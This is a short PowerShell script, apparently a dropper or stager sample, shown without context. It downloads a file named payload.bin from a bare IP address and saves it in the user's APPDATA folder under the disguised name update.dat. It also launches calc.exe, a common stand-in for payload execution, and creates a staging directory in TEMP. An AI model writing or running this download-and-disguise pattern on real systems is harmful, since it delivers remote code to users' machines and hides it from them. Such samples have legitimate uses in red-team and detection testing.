$PayloadUrl = 'https://203.0.113.228/downloads/payload.bin'
$PayloadPath = "$env:APPDATA\update.dat"
Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadPath -UseBasicParsing
Start-Process -FilePath 'calc.exe'
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
